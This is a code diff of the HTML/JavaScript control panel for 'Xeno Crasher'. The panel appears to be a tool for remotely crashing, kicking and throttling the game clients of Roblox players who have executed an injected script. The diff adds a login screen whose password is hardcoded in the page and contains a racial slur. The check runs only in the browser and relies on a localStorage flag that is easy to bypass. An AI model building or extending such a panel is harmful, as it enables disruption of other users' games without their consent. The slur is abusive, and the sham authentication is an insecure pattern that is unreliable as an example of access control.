@@ -7,6 +7,105 @@
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { font-family: Arial, sans-serif; background: #0b0d11; color: #e8edf5; padding: 20px; }
+        
+        /* ============================================
+           LOGIN PAGE
+           ============================================ */
+        .login-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: #0b0d11;
+            z-index: 9999;
+        }
+        .login-container.hidden {
+            display: none;
+        }
+        .login-box {
+            background: #12171f;
+            padding: 40px;
+            border-radius: 16px;
+            border: 1px solid #1f2937;
+            width: 100%;
+            max-width: 400px;
+        }
+        .login-box h1 {
+            text-align: center;
+            color: #dc2626;
+            margin-bottom: 10px;
+        }
+        .login-box .sub {
+            text-align: center;
+            color: #6b7a8f;
+            margin-bottom: 30px;
+        }
+        .login-box input {
+            width: 100%;
+            padding: 14px;
+            border-radius: 8px;
+            border: 1px solid #2a3646;
+            background: #0b0d11;
+            color: #e8edf5;
+            font-size: 16px;
+            margin-bottom: 15px;
+        }
+        .login-box input:focus {
+            outline: none;
+            border-color: #6366f1;
+        }
+        .login-box .btn {
+            width: 100%;
+            padding: 14px;
+            border: none;
+            border-radius: 8px;
+            background: #dc2626;
+            color: #fff;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        .login-box .btn:hover {
+            background: #b91c1c;
+        }
+        .login-box .error {
+            color: #ef4444;
+            text-align: center;
+            margin-top: 10px;
+            display: none;
+        }
+        .login-box .error.show {
+            display: block;
+        }
+        .login-box .logout-btn {
+            text-align: center;
+            margin-top: 15px;
+        }
+        .login-box .logout-btn a {
+            color: #6b7a8f;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        .login-box .logout-btn a:hover {
+            color: #e8edf5;
+        }
+        
+        /* ============================================
+           MAIN APP (hidden until logged in)
+           ============================================ */
+        .app {
+            display: none;
+        }
+        .app.show {
+            display: block;
+        }
+        
         .container { max-width: 1200px; margin: 0 auto; }
         .header { background: #12171f; padding: 15px 20px; border-radius: 10px; margin-bottom: 20px; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px; }
         .logo { font-size: 24px; font-weight: bold; color: #dc2626; }
@@ -57,53 +156,122 @@
 </head>
 <body>
 
-<div class="container">
-    <header class="header">
-        <div class="logo">💀 Xeno Crasher</div>
-        <div class="stats">
-            <span>🟢 <span class="num" id="onlineCount">0</span> online</span>
-            <span>⏱ <span class="num" id="refreshTimer">1s</span></span>
+<!-- ============================================
+LOGIN SCREEN
+============================================ -->
+<div class="login-container" id="loginContainer">
+    <div class="login-box">
+        <h1>💀 Xeno Crasher</h1>
+        <p class="sub">Enter password to access panel</p>
+        <input type="password" id="passwordInput" placeholder="Enter password..." autofocus />
+        <button class="btn" onclick="login()">🔓 Login</button>
+        <div class="error" id="loginError">❌ Incorrect password!</div>
+    </div>
+</div>
+
+<!-- ============================================
+MAIN APP
+============================================ -->
+<div class="app" id="app">
+    <div class="container">
+        <header class="header">
+            <div class="logo">💀 Xeno Crasher</div>
+            <div class="stats">
+                <span>🟢 <span class="num" id="onlineCount">0</span> online</span>
+                <span>⏱ <span class="num" id="refreshTimer">1s</span></span>
+                <span><a href="#" onclick="logout()" style="color:#6b7a8f;text-decoration:none;font-size:14px;">🚪 Logout</a></span>
+            </div>
+        </header>
+
+        <div class="main">
+            <section class="players-section">
+                <h2>👥 Players <span id="totalBadge">0</span></h2>
+                <div class="player-grid" id="playerGrid">
+                    <div class="empty">No players online. Execute the script in Roblox.</div>
+                </div>
+            </section>
+
+            <aside class="command-panel">
+                <h3>🎮 Controls</h3>
+                <p class="sub" id="targetStatus">Select a player</p>
+                
+                <div class="fps-control">
+                    <input type="number" id="fpsInput" placeholder="FPS" min="1" max="60" />
+                    <button class="btn btn-primary" id="btnSetFps">Set</button>
+                </div>
+                <button class="btn btn-secondary" id="btnDisableFps">Disable FPS Limit</button>
+                
+                <div class="kick-message">
+                    <input type="text" id="kickMessageInput" placeholder="Kick message..." />
+                    <button class="btn btn-warning" id="btnKick">👢 KICK</button>
+                </div>
+                
+                <button class="btn btn-danger" id="btnCrash">💥 CRASH</button>
+            </aside>
         </div>
-    </header>
-
-    <div class="main">
-        <section class="players-section">
-            <h2>👥 Players <span id="totalBadge">0</span></h2>
-            <div class="player-grid" id="playerGrid">
-                <div class="empty">No players online. Execute the script in Roblox.</div>
-            </div>
-        </section>
-
-        <aside class="command-panel">
-            <h3>🎮 Controls</h3>
-            <p class="sub" id="targetStatus">Select a player</p>
-            
-            <!-- FPS CONTROL -->
-            <div class="fps-control">
-                <input type="number" id="fpsInput" placeholder="FPS" min="1" max="60" />
-                <button class="btn btn-primary" id="btnSetFps">Set</button>
-            </div>
-            <button class="btn btn-secondary" id="btnDisableFps">Disable FPS Limit</button>
-            
-            <!-- KICK WITH MESSAGE -->
-            <div class="kick-message">
-                <input type="text" id="kickMessageInput" placeholder="Kick message..." />
-                <button class="btn btn-warning" id="btnKick">👢 KICK</button>
-            </div>
-            
-            <!-- CRASH -->
-            <button class="btn btn-danger" id="btnCrash">💥 CRASH</button>
-        </aside>
     </div>
 </div>
 
 <div class="toast" id="toast"></div>
 
 <script>
-    const API_BASE = window.location.origin;
+    // ============================================
+    // PASSWORD CONFIG
+    // ============================================
+    const PASSWORD = 'ezcrashernigaegg';
+    
+    // ============================================
+    // LOGIN
+    // ============================================
+    function login() {
+        const input = document.getElementById('passwordInput');
+        const error = document.getElementById('loginError');
+        
+        if (input.value === PASSWORD) {
+            document.getElementById('loginContainer').classList.add('hidden');
+            document.getElementById('app').classList.add('show');
+            error.classList.remove('show');
+            localStorage.setItem('xeno_logged_in', 'true');
+            input.value = '';
+            startApp();
+        } else {
+            error.classList.add('show');
+            input.value = '';
+            input.focus();
+        }
+    }
+    
+    function logout() {
+        localStorage.removeItem('xeno_logged_in');
+        document.getElementById('loginContainer').classList.remove('hidden');
+        document.getElementById('app').classList.remove('show');
+    }
+    
+    // Check if already logged in
+    if (localStorage.getItem('xeno_logged_in') === 'true') {
+        document.getElementById('loginContainer').classList.add('hidden');
+        document.getElementById('app').classList.add('show');
+        startApp();
+    }
+    
+    // Enter key to login
+    document.getElementById('passwordInput').addEventListener('keydown', function(e) {
+        if (e.key === 'Enter') login();
+    });
+    
+    // ============================================
+    // APP LOGIC
+    // ============================================
     let selectedUserId = null;
     let players = new Map();
-
+    
+    function startApp() {
+        fetchPlayers();
+        setInterval(fetchPlayers, 3000);
+    }
+    
+    const API_BASE = window.location.origin;
+    
     async function fetchPlayers() {
         try {
             const res = await fetch(API_BASE + '/api/players');
@@ -176,7 +344,6 @@
     // BUTTON EVENTS
     // ============================================
 
-    // CRASH
     document.getElementById('btnCrash').addEventListener('click', () => {
         if (!selectedUserId) { showToast('Select a player first!'); return; }
         const p = players.get(selectedUserId);
@@ -185,7 +352,6 @@
         }
     });
 
-    // KICK with message
     document.getElementById('btnKick').addEventListener('click', () => {
         if (!selectedUserId) { showToast('Select a player first!'); return; }
         const p = players.get(selectedUserId);
@@ -197,7 +363,6 @@
         }
     });
 
-    // SET FPS
     document.getElementById('btnSetFps').addEventListener('click', () => {
         if (!selectedUserId) { showToast('Select a player first!'); return; }
         const fpsInput = document.getElementById('fpsInput');
@@ -210,15 +375,10 @@
         fpsInput.value = '';
     });
 
-    // DISABLE FPS
     document.getElementById('btnDisableFps').addEventListener('click', () => {
         if (!selectedUserId) { showToast('Select a player first!'); return; }
         sendCommand({ fps_limit: false });
     });
-
-    // Auto-refresh every 3 seconds
-    fetchPlayers();
-    setInterval(fetchPlayers, 3000);
 </script>
 
 </body>
